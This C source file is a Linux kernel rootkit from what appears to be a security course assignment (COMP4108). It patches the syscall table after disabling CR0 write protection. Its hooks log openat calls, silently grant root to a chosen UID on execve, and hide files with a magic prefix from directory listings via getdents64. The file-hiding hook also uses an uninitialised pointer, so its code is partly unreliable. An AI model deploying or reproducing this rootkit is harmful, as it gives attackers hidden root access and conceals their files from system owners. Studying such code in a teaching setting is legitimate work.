/*
 * COMP4108 Rootkit Framework
*/

#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>

#ifndef __NR_getdents
#define __NR_getdents 141
#endif
#define MODULE_NAME "rootkit"

// The linux dirent structure for Part C
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
        char            pad;
        char            d_type;
};

unsigned long cr0;
static unsigned long *__sys_call_table;

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

static t_syscall original_openat; // create a variable to store the original openat function

/*
 * TODO: NEEDED FOR PART B AND C
 *  create a variable as above to store the original execve and getdents functions
*/

static t_syscall original_execve;
static t_syscall original_getdents;
/*
 * The suffix to use for the openat hook code. This is the file extension
 * we will be detecting. See insert.sh for how this is passed to the rootkit.
*/
static char* suffix;
module_param(suffix, charp, 0);
MODULE_PARM_DESC(suffix, "Received suffix parameter");

//******
//TODO: NEEDED FOR PART B
//	Accept root_uid as a kernel module parameter 
//	(see module_parm() example above)
//******
/*
 * When a user with an effective UID = root_uid runs a command via execve()
 * we make our hook grant them root priv. root_uid's value is provided as a
 * kernel module argument.
 */
static int root_uid;
module_param(root_uid, int, 0);
MODULE_PARM_DESC(root_uid,"Received root_uid perameter");


//******
//TODO: NEEDED FOR PART C
//	Accept magic_prefix as a kernel module parameter
//	(see module_parm() example above)
//******
/*
 * Files that start with a prefix matching magic_prefix are removed from the
 * linux_dirent64* buffer that is returned to the caller of getdents()
 */
static char* magic_prefix;
module_param(magic_prefix, charp, 0);
MODULE_PARM_DESC(magic_prefix,"Received magic perameter");


/* 
 * TODO: NEEDED FOR PART A
 *  Update the string provided to the kallsyms_lookup_name function
 * 
 * Locates the address of the system call table using kallsyms_lookup_name
 * and returns it as an unsigned long *
*/
unsigned long * get_syscall_table_bf(void){
  unsigned long *syscall_table;
  syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
  return syscall_table;
}


/*
 * Our version of the syscall is defined here. We want to match the return type
 * and argument signature of the original syscall.
 * 
 * This is an example of how to hook openat(). Our version will print to the
 * kernel which file the function was called for.
*/
asmlinkage int new_openat(const struct pt_regs* regs){
  // Declare our return value and a variable to store the filename
  long ret;
  char *filename;
  size_t filename_len;
  size_t suffix_len;

  // Get the filename the syscall was called for
  filename = kmalloc(4096, GFP_KERNEL); // alocate kernel memory

  // copy the filename into the kernel variable
  if (strncpy_from_user(filename, (void*) regs->si, 4096) < 0){
    kfree(filename);
    return 0;
  }

  // Check if the file is a .txt (has the .txt extension)
  filename_len = strlen(filename);
  suffix_len = strlen(suffix);
  if (filename_len >= suffix_len){
    if (strncmp(filename + (filename_len - suffix_len), suffix, suffix_len) == 0){
      printk(KERN_INFO "openat() called for %s\n", filename);
    }
  }

  kfree(filename);

  // Invoke the original openat syscall
  ret = original_openat(regs);

  return ret;
}

/*
 * Our version of the syscall is defined here. We want to match the return type
 * and argument signature of the original syscall.
 * 
 * This is an example of how to hook execve(). Our version will print to the
 * kernel which file the function was called for.
*/
asmlinkage int new_execve(const struct pt_regs* regs){
  // Declare our return value and a variable to store the filename
  long ret;
  char *filename;
  int euid; //declare integer variable for to store effective UID of current proccess 
  euid = current_euid().val; 

  // Get the filename the syscall was called for
  filename = kmalloc(4096, GFP_KERNEL); // alocate kernel memory

   if (strncpy_from_user(filename, (void*) regs->si, 4096) < 0){
    kfree(filename);
    return 0;
  }

  printk(KERN_INFO "Excecuting %s\n", filename);
  printk(KERN_INFO "Effective UID %d\n", euid);

  kfree(filename);

  if (root_uid == current_euid().val){ //check euid of current proccess is equal to stored root uid
    struct cred *new; //new struct for process credentials in kernel
    new = prepare_kernel_cred(NULL); //initialize new kernel credentials 
    new->uid.val = 0; //set new credentials to 0(root)
//
    commit_creds(new); //commit new credentials to current process replacing with elevated one
  }

  // Invoke the original openat syscall
  ret = original_execve(regs);

  return ret;
}


asmlinkage int new_getdents(const struct pt_regs* regs){
	//initialize for directory entries
    struct linux_dirent64 *c; 
	struct linux_dirent64 *prev_dirp;
    struct linux_dirent64 *dirp;
   
    ssize_t ret; //define return values
    ssize_t offset; //define offsets
    size_t prefix_len; //length of magic prefix

    prefix_len = strlen(magic_prefix);
    ret = original_getdents(regs); //calling original getdents64 syscall
    printk(KERN_INFO "getdents64() hook invoked.\n");
    dirp = kmalloc(regs->dx, GFP_KERNEL); // allocate kernel memory for directory entries
    if (copy_from_user(dirp, (void*) regs->si, regs->dx) < 0){ //copy directories from user space to kernel space
      kfree(dirp);
      return 0;
    }

    offset = 0;
	
//process each directory entry
    while (offset < ret) {
      c = (struct linux_dirent64 *) ((char*)dirp + offset);
      printk(KERN_INFO "entry: %s ", c->d_name);
	  if(strlen(c->d_name) >= prefix_len){
        if(strncmp(c->d_name, magic_prefix, prefix_len) == 0){
          prev_dirp->d_reclen += c->d_reclen;
        }
      }
      prev_dirp = c; //move to next directory entry
      offset += c->d_reclen;
    }

    if (copy_to_user((void*)(regs->si), dirp, regs->dx)<0){ //copy modified directory to entries back to user space
      kfree(dirp);
      return 0;
    }
	
    kfree(dirp); //free allocated kernel memory
    return ret;
}

/*
 * Used to let us modify memory regions and syscalls
*/
static inline void write_cr0_forced(unsigned long val){
  unsigned long __force_order;
  asm volatile(
    "mov %0, %%cr0"
    : "+r"(val), "+m"(__force_order));
}

/*
 * Protect memory (so it can't be modified)
*/
static inline void protect_memory(void){
  write_cr0_forced(cr0);
}

/*
 * Unprotect memory (so we can modify it)
*/
static inline void unprotect_memory(void)
{
  write_cr0_forced(cr0 & ~0x00010000);
}

/*
 * Module initalization
*/
static int __init init_rootkit(void)
{
  printk(KERN_INFO "Rootkit module initializing.\n");

  __sys_call_table = get_syscall_table_bf(); // Get the sys_call_table information

  if (!__sys_call_table)
    return -1;

  cr0 = read_cr0();

  /*
   * TODO: NEEDED FOR PART A, B, AND C
   *  Uncomment the following lines as needed to store the original functions
   *  before they are hooked. You will need to add lines for the execve and
   *  getdents functions.
  */

  // Let's store the original functions so they can be restored later
	original_openat = (t_syscall)__sys_call_table[__NR_openat];
	original_execve = (t_syscall)__sys_call_table[__NR_execve];
	original_getdents = (t_syscall)__sys_call_table[__NR_getdents64];
  /*
   * TODO: NEEDED FOR PART A
   *  Unprotect the memory by calling the appropriate function
  */
  unprotect_memory();
  
  /*
   * TODO: NEEDED FOR PART A
   *  Uncomment after completing the unprotect and protect TODO's
  */

  // Let's hook openat() for an example of how to use the framework
   __sys_call_table[__NR_openat] = (unsigned long) new_openat;

  /*
   * TODO: NEEDED FOR PARTS B AND C
   *  Hook your new execve and getdents functions after writing them
  */

  // Let's hook execve() for privilege excalation
   __sys_call_table[__NR_execve] = (unsigned long) new_execve;
  // Let's hook getdents() to hide our files
  __sys_call_table[__NR_getdents64] = (unsigned long) new_getdents;
  

  /*
   * TODO: NEEDED FOR PART A
   *  Protect the memory by calling the appropriate function
  */
  protect_memory();
  
  printk(KERN_INFO "Rootkit module is loaded!\n");
  return 0; // For successful load
}

static void __exit cleanup_rootkit(void){
  printk(KERN_INFO "Rootkit module is unloaded!\n");

  /*
   * TODO: NEEDED FOR PART A
   *  Unprotect the memory by calling the appropriate function
  */
  unprotect_memory();
  /*
   * TODO: NEEDED FOR PART A
   *  Uncomment after completing the unprotect and protect TODO's
  */
  // Let's unhook and restore the original openat() function
  __sys_call_table[__NR_openat] = (unsigned long)original_openat;

  /*
   * TODO: NEEDED FOR PARTS B AND C
   *  Unhook and restore the execve and getdents functions
  */

  // Let's unhook and restore the original execve() function
__sys_call_table[__NR_execve] = (unsigned long)original_execve;
  // Let's unhook and restore the original getdents() function
  __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;

  /*
   * TODO: NEEDED FOR PART A
   *  Protect the memory by calling the appropriate function
  */
  protect_memory();
  printk(KERN_INFO "Rootkit module cleanup copmlete.\n");
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_AUTHOR("Your Friendly Neighbourhood Hacker");
MODULE_LICENSE("GPL");
